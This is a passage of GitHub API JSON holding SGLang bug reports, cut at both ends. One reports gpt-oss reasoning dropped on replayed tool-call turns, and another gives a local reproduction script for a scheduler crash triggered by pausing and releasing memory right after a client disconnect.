GB","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/45002/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/45002/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44931","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44931/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44931/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44931/events","html_url":"https://github.com/sgl-project/sglang/issues/44931","id":5903214243,"node_id":"I_kwDOLCAjRs8AAAABX9vmow","number":44931,"title":"[Bug] gpt-oss on /v1/chat/completions drops replayed reasoning: the template reads `thinking`, SGLang only forwards `reasoning_content`","user":{"login":"yyming009","id":19488796,"node_id":"MDQ6VXNlcjE5NDg4Nzk2","avatar_url":"https://avatars.githubusercontent.com/u/19488796?v=4","gravatar_id":"","url":"https://api.github.com/users/yyming009","html_url":"https://github.com/yyming009","followers_url":"https://api.github.com/users/yyming009/followers","following_url":"https://api.github.com/users/yyming009/following{/other_user}","gists_url":"https://api.github.com/users/yyming009/gists{/gist_id}","starred_url":"https://api.github.com/users/yyming009/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/yyming009/subscriptions","organizations_url":"https://api.github.com/users/yyming009/orgs","repos_url":"https://api.github.com/users/yyming009/repos","events_url":"https://api.github.com/users/yyming009/events{/privacy}","received_events_url":"https://api.github.com/users/yyming009/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":1,"created_at":"2026-10-17T21:20:46Z","updated_at":"2026-10-18T10:12:33Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\n### Summary\n\nWhen we did tool call among mutli-turns by using gpt-oss（--reasoning-parser gpt-oss), the previous turn’s CoT is not passed back to the model, instead, it is lost in every replayed tool-calling turn. How it was discovered is we compared prompt token counts between SGLang and vLLM showed that SGLang was missing the CoT tokens (268 vs. 291).\n\n### Details (AI-assisted draft, reviewed by the reporter; see the disclosure below)\n\nWith `--reasoning-parser gpt-oss`, SGLang returns gpt-oss's analysis channel as `message.reasoning_content`. When a client sends that assistant tool-call turn back (assistant tool call → tool result → next request), the chain of thought never reaches the prompt.\n\n- **What the template needs.** gpt-oss's chat template (`openai/gpt-oss-20b`; `-120b` ships the same file) reads prior CoT only from `message.thinking`. For a tool-call turn with no later final answer, it re-renders the CoT as `<|start|>assistant<|channel|>analysis<|message|>…<|end|>`.\n- **What the spec says.** This is the harmony rule: \"The exception for this is tool/function calling. The model is able to call tools as part of its chain-of-thought and because of that, we should pass the previous chain-of-thought back in as input for subsequent sampling.\" ([harmony guide](https://developers.openai.com/cookbook/articles/openai-harmony)). OpenAI's [raw-CoT guide](https://developers.openai.com/cookbook/articles/gpt-oss/handle-raw-cot) also asks Chat Completions servers to accept the previous reasoning on later turns and to handle it as the chat template does.\n- **No input shape works.** None of the shapes SGLang accepts reaches `thinking`. On v0.5.22, each of them gives exactly the CoT-free prompt (the same 268 prompt ids for the example below):\n  - `reasoning_content` is accepted, then passed to the template under that name, which the template ignores.\n  - `reasoning` and a top-level `thinking` key are dropped at request validation. #44109 would alias `reasoning` to `reasoning_content`, which the template still ignores.\n  - `thinking`/`reasoning` content parts are dropped before rendering.\n- **Scale.** We replayed 73 gpt-oss chat transitions; 52 of them require keeping a prior CoT. In all 52, SGLang v0.5.21 builds the CoT-free prompt (same token count as rendering the history without the CoT), with `reasoning_content` and with `reasoning`. An older 0.5.17.dev36 build behaves the same. vLLM v0.31.0 keeps the CoT in all of them. The reproduction below gives the same result on v0.5.22, the latest release.\n- **Impact.**\n  - The model loses its own reasoning across every tool call.\n  - The replayed prompt no longer extends the previous prompt plus output, so prefix-cache reuse stops at the start of that assistant turn.\n\n**Root cause on `main`** (f39c2693, 2026-10-16; the relevant code is unchanged since v0.5.22):\n\n- [`protocol.py` `ChatCompletionMessageGenericParam`](https://github.com/sgl-project/sglang/blob/f39c2693aa896de3fca9936645791cea634816ea/python/sglang/srt/entrypoints/openai/protocol.py#L733-L743) declares `reasoning_content` but no `thinking`. Unknown keys are ignored.\n- [`serving_chat.py` `OpenAIServingChat._apply_jinja_template`](https://github.com/sgl-project/sglang/blob/f39c2693aa896de3fca9936645791cea634816ea/python/sglang/srt/entrypoints/openai/serving_chat.py#L1519-L1769), default Jinja branch:\n  - messages are `model_dump()`-ed and handed to `apply_chat_template` unchanged;\n  - nothing maps `reasoning_content` to the field the template reads;\n  - gpt-oss chat requests have used this path since #9043.\n- [`jinja_template_utils.py` `process_content_for_template_format`](https://github.com/sgl-project/sglang/blob/f39c2693aa896de3fca9936645791cea634816ea/python/sglang/srt/parser/jinja_template_utils.py#L183-L306) keeps only text (and media) parts, so thinking parts are dropped.\n\n**Possible fix.** On the Jinja path, copy an assistant message's `reasoning_content` into `thinking` when the template reads `thinking`. Alternatively, render gpt-oss chat requests through openai_harmony, as `/v1/responses` already does. One edge case: the template raises \"Cannot pass both content and thinking in an assistant message with tool calls!\" when a tool-call turn has non-empty `content`, so a preamble plus CoT needs handling.\n\n**Related, not duplicates:**\n\n- #44109: the `reasoning` alias. It is complementary but does not reach `thinking`.\n- #40959, #40965, #40968: Anthropic thinking history for templates that read `reasoning_content`.\n- #10061: echoing raw `<|channel|>` content back fails in the template.\n- The cookbook's gpt-oss \"Handling Tool Call Results\" example also sends the tool-call turn back without its CoT.\n\n### AI assistance disclosure\nI used an AI coding assistant to analyze our test logs, read the SGLang source and draft the \"Details\" section and the reproduction script. I reviewed them and checked every number against our runs before posting. The summary is my own.\n\n\n### Reproduction\n\nServer (default settings otherwise; no `--chat-template`):\n\n```bash\npython3 -m sglang.launch_server --model-path openai/gpt-oss-20b \\\n  --reasoning-parser gpt-oss --tool-call-parser gpt-oss --port 30000\n```\n\nScript (`pip install openai transformers`). It sends a replayed tool-call turn with its CoT in `reasoning_content`, then counts the template's own prompt with and without the CoT:\n\n```python\nimport json\nfrom openai import OpenAI\nfrom transformers import AutoTokenizer\n\nclient = OpenAI(base_url=\"http://127.0.0.1:30000/v1\", api_key=\"EMPTY\")\ntok = AutoTokenizer.from_pretrained(\"openai/gpt-oss-20b\")\n\ndef tool(name, desc, arg, typ):\n    return {\"type\": \"function\", \"function\": {\"name\": name, \"description\": desc, \"parameters\": {\n        \"type\": \"object\", \"properties\": {arg: {\"type\": typ, \"description\": arg}}, \"required\": [arg]}}}\n\nTOOLS = [tool(\"bash\", \"Run a shell command in the sandbox.\", \"command\", \"string\"),\n         tool(\"read_file\", \"Read a file.\", \"path\", \"string\"),\n         tool(\"sleep\", \"Wait for a number of seconds.\", \"seconds\", \"integer\")]\nCOT = \"[tc1.r0] I should look at step 0 before changing anything.\"\nARGS = {\"command\": \"grep -n parse src/io_0.py  # tc1.0\"}\n\ndef history(content, arguments, **reasoning):\n    return [\n        {\"role\": \"system\", \"content\": \"You are a careful software agent. Use the tools to inspect before you edit.\"},\n        {\"role\": \"user\", \"content\": \"[tc1.u0] Find why the test in tests/test_io.py fails and fix it.\"},\n        {\"role\": \"assistant\", \"content\": content, **reasoning, \"tool_calls\": [\n            {\"id\": \"call_0_0\", \"type\": \"function\", \"function\": {\"name\": \"bash\", \"arguments\": arguments}}]},\n        {\"role\": \"tool\", \"tool_call_id\": \"call_0_0\", \"content\": \"[tc1.o0] output of step 0: line 10 parse(data)\"},\n    ]\n\n# The assistant turn replayed the way SGLang returned it: CoT in `reasoning_content`.\nr = client.chat.completions.create(\n    model=client.models.list().data[0].id, tools=TOOLS, max_tokens=1, temperature=0,\n    messages=history(None, json.dumps(ARGS), reasoning_content=COT))\nprint(\"server prompt_tokens        :\", r.usage.prompt_tokens)\n\n# Reference: the model's chat template, CoT in the field it reads, and CoT removed.\ndef ref(**reasoning):\n    text = tok.apply_chat_template(history(\"\", ARGS, **reasoning), tools=TOOLS,\n                                   tokenize=False, add_generation_prompt=True)\n    return len(tok.encode(text, add_special_tokens=False))\n\nprint(\"template, CoT in `thinking`:\", ref(thinking=COT))\nprint(\"template, CoT removed      :\", ref())\n```\n\n**Actual** on SGLang v0.5.22, the latest release (v0.5.21 and an older 0.5.17.dev36 build give the same):\n\n```\nserver prompt_tokens        : 268\ntemplate, CoT in `thinking`: 291\ntemplate, CoT removed      : 268\n```\n\n- **Same with `reasoning`.** Sending the CoT as `reasoning` also gives 268. So do a top-level `thinking` key and a `thinking` or `reasoning` content part.\n- **The prompt itself.** On v0.5.22, the prompt ids returned with `\"return_input_ids_in_sglext\": true` are exactly the template's CoT-free prompt. They continue `…fix it.<|end|><|start|>assistant to=functions.bash<|channel|>commentary json<|message|>{\"command…`, with no analysis message. v0.5.21 shows the same continuation.\n\n**Expected:** 291. The prompt should continue `…fix it.<|end|><|start|>assistant<|channel|>analysis<|message|>[tc1.r0] I should look at step 0 before changing anything.<|end|><|start|>assistant to=functions.bash…`. vLLM v0.31.0 (`--tool-call-parser openai`) keeps this analysis message for the same request.\n\n\n### Environment\n\n`python3 -m sglang.check_env` in the `lmsysorg/sglang:v0.5.22` container used for the run (trimmed to versions; paths, topology and host details removed):\n\n```\nPython: 3.12.15\nCUDA available: True\nGPU 0: NVIDIA B200\nGPU 0 Compute Capability: 10.0\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 580.178.04\nPyTorch: 2.14.1+cu130\nsglang: 0.5.22\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.1\nflashinfer_cubin: 0.7.1\nflashinfer_jit_cache: 0.7.1+cu130\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.2\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.15.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0+cu130\n```\n\n- SGLang v0.5.22, the latest release: docker `lmsysorg/sglang:v0.5.22`, whose source checkout is the `v0.5.22` tag commit baa9befa. v0.5.21 and an older 0.5.17.dev36 build give the same results.\n- `main` at f39c2693 (2026-10-16): the relevant code is unchanged from v0.5.22. Checked by diffing the source, not by running.\n- Model `openai/gpt-oss-20b` at revision 6cee5e81, which is the current Hub head. Its `chat_template.jinja` is byte-identical to `openai/gpt-oss-120b`'s.\n- Launch: the reproduction's command with default settings otherwise (`--reasoning-parser gpt-oss --tool-call-parser gpt-oss --port 30000`; we also set `--host 127.0.0.1` and a fixed `--nccl-port`). The weights were a local copy of revision 6cee5e81, served as `openai/gpt-oss-20b`. No custom chat template: the server log says \"Using default HuggingFace chat template\". The v0.5.21 runs also passed `--tp 1 --context-length 32768 --enable-cache-report`.\n- 1x NVIDIA B200, driver 580.178.04, CUDA 13.0. The bug is in request pre-processing, so the hardware should not matter.\n- The script's reference counts (291 and 268) are the same with transformers 5.19.0 (in the v0.5.22 image) and 5.20.0.\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44931/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44931/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44840","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44840/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44840/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44840/events","html_url":"https://github.com/sgl-project/sglang/issues/44840","id":5894152029,"node_id":"I_kwDOLCAjRs8AAAABX1GfXQ","number":44840,"title":"[Bug] `pause_generation(abort)` + `release_memory_occupation` right after a client disconnect crashes scheduler","user":{"login":"Yunzez","id":56664264,"node_id":"MDQ6VXNlcjU2NjY0MjY0","avatar_url":"https://avatars.githubusercontent.com/u/56664264?v=4","gravatar_id":"","url":"https://api.github.com/users/Yunzez","html_url":"https://github.com/Yunzez","followers_url":"https://api.github.com/users/Yunzez/followers","following_url":"https://api.github.com/users/Yunzez/following{/other_user}","gists_url":"https://api.github.com/users/Yunzez/gists{/gist_id}","starred_url":"https://api.github.com/users/Yunzez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Yunzez/subscriptions","organizations_url":"https://api.github.com/users/Yunzez/orgs","repos_url":"https://api.github.com/users/Yunzez/repos","events_url":"https://api.github.com/users/Yunzez/events{/privacy}","received_events_url":"https://api.github.com/users/Yunzez/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":1,"created_at":"2026-10-17T02:54:20Z","updated_at":"2026-10-18T02:46:05Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Checklist\n\n- [x] I searched related issues but found no solution.\n- [x] The bug persists in the latest version.\n- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.\n- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.\n- [x] Please use English. Otherwise, it will be closed.\n\n### Describe the bug\n\nNo sure who will ever do this, but fuzzing found it... \n\nOn a server started with `--enable-memory-saver`, this sequence kills the scheduler:\n\n1. a streamed `/generate` is running and the client closes the connection (a disconnect);\n2. within about 1 ms, `POST /pause_generation {\"mode\": \"abort\"}` -- answered `200 \"Generation paused successfully.\"` in a few ms;\n3. `POST /release_memory_occupation {}` -- never answered; the connection is dropped and the server exits:\n\n```\n[2026-10-15 13:49:39] INFO:     127.0.0.1:32960 - \"POST /pause_generation HTTP/1.1\" 200 OK\n[2026-10-15 13:49:39] Scheduler hit an exception: Traceback (most recent call last):\n  ...\n  File \".../sglang/srt/managers/scheduler_components/weight_updater.py\", line 339, in release_memory_occupation\n    assert self.is_fully_idle(\nAssertionError: release_memory_occupation should be called only when server is idle.\n[2026-10-15 13:49:39] SIGQUIT received. signum=None, frame=None. It usually means one child failed.\n```\n\n### Reproduction\n\n```bash\npython -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n    --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\npython3 repro.py http://127.0.0.1:30000      # stdlib only\n```\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal client: a streamed request is disconnected, and right after that /pause_generation {\"mode\": \"abort\"} and\n/release_memory_occupation kill the SGLang scheduler.\n\nServer (SGLang main):\n    python -m sglang.launch_server --model-path Qwen/Qwen3-0.6B --port 30000 \\\n        --enable-memory-saver --max-total-tokens 6000 --max-running-requests 32\n\nRun:  python3 repro_issue.py http://127.0.0.1:30000      (stdlib only)\nEach trial streams a /generate, reads its first chunks, closes the connection (a client disconnect), waits DELAY ms,\npauses with mode=abort, releases memory, then resumes memory and continues generation. Exit 1 when the server dies.\n\"\"\"\nimport http.client\nimport json\nimport sys\nimport time\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nBASE = sys.argv[1] if len(sys.argv) > 1 else \"http://127.0.0.1:30000\"\nHOST = urllib.parse.urlparse(BASE)\nDELAYS_MS = (0, 1) * 5\n\n\ndef post(path, body, timeout=30):\n    req = urllib.request.Request(BASE + path, json.dumps(body).encode(), {\"Content-Type\": \"application/json\"})\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as r:\n            return r.status\n    except urllib.error.HTTPError as e:\n        return e.code\n    except Exception as e:  # connection refused / reset: the server is gone\n        return type(e).__name__\n\n\ndef alive():\n    try:\n        with urllib.request.urlopen(BASE + \"/health\", timeout=5) as r:\n            return r.status == 200\n    except Exception:\n        return False\n\n\ndef stream_then_disconnect(chunks=3):\n    \"\"\"Start a streamed /generate, read a few chunks, then drop the connection.\"\"\"\n    conn = http.client.HTTPConnection(HOST.hostname, HOST.port, timeout=60)\n    body = {\"text\": \"Write a long story about a lighthouse keeper.\", \"stream\": True,\n            \"sampling_params\": {\"max_new_tokens\": 1024, \"temperature\": 0, \"ignore_eos\": True}}\n    conn.request(\"POST\", \"/generate\", json.dumps(body), {\"Content-Type\": \"application/json\"})\n    resp = conn.getresponse()\n    seen = 0\n    while seen < chunks:\n        line = resp.fp.readline()\n        if not line:\n            break\n        if line.startswith(b\"data:\"):\n            seen += 1\n    time.sleep(0.1)\n    conn.sock.close()          # the client disconnect\n    conn.close()\n\n\ndef main():\n    post(\"/generate\", {\"text\": \"warm up\", \"sampling_params\": {\"max_new_tokens\": 8}}, 300)\n    for i, delay in enumerate(DELAYS_MS):\n        stream_then_disconnect()\n        time.sleep(delay / 1000)\n        p = post(\"/pause_generation\", {\"mode\": \"abort\"})\n        r = post(\"/release_memory_occupation\", {}) if p == 200 else None\n        # (/health is not served while memory is released, so judge after resume + continue)\n        u = post(\"/resume_memory_occupation\", {}) if r == 200 else None\n        c = post(\"/continue_generation\", {}) if u == 200 else None\n        time.sleep(1.0)\n        up = alive()\n        print(f\"trial {i}: pause(abort) {delay} ms after the disconnect -> pause {p}, release {r}, resume {u}, \"\n              f\"continue {c}; {'alive' if up else 'SERVER DOWN'}\")\n        if not up:\n            return 1\n    print(\"not reproduced\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```\n\nOutput on three fresh servers in a row (RTX A4000, main 7224fce1b5):\n\n```\n=== run 1 ===\ntrial 0: pause(abort) 0 ms after the disconnect -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n=== run 2 ===\ntrial 0: pause(abort) 0 ms after the disconnect -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n=== run 3 ===\ntrial 0: pause(abort) 0 ms after the disconnect -> pause 200, release RemoteDisconnected, resume None, continue None; SERVER DOWN\n```\n\n**Some possible cause (line numbers on main 7224fce1b5), again assisted with Claude**\n\n1. A disconnect makes the tokenizer manager abort that request (`tokenizer_manager.py` ~1916-1925); the scheduler drops it from `running_batch` only on a later step.\n2. `pause_generation` with `mode=\"abort\"` never reaches the scheduler: the tokenizer manager calls `abort_request(abort_all=True)` and answers 200 (`tokenizer_manager.py` ~2206-2219). The scheduler's own `pause_generation` accepts only `in_place` / `retract` (`scheduler.py` ~5589), so `_engine_paused` stays `False`.\n3. `release_memory_occupation` asserts `is_fully_idle(ignore_waiting=scheduler._engine_paused)` (`weight_updater.py` ~339). With `_engine_paused` False and the disconnected request still in `running_batch`, the check fails and the scheduler process exits.\n\n\n### Environment\n\n<details>\n<summary><code>python -m sglang.check_env</code></summary>\n\n```text\nPython: 3.12.3 (main, Apr 23 2024, 14:57:18) [GCC 11.4.1 20230605 (Red Hat 11.4.1-2)]\nCUDA available: True\nGPU 0: NVIDIA RTX A4000\nGPU 0 Compute Capability: 8.6\nCUDA_HOME: <venv>/lib/python3.12/site-packages/nvidia/cu13\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 595.91.07\nPyTorch: 2.14.1+cu130\nsglang: 0.0.0.dev1+g7224fce1b\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.1\nflashinfer_cubin: Module Not Found\nflashinfer_jit_cache: Module Not Found\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.5\nfastapi: 0.143.0\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.2\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.14.1\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.13.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0\nNVIDIA Topology: \n    GPU0    NIC0    CPU Affinity    NUMA Affinity    GPU NUMA ID\nGPU0     X     NODE    3-6    0        N/A\nNIC0    NODE     X                 \n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nNIC Legend:\n\n  NIC0: mlx5_bond_0\n\n\nulimit soft: 1024\n```\n\n</details>","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44840/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/4484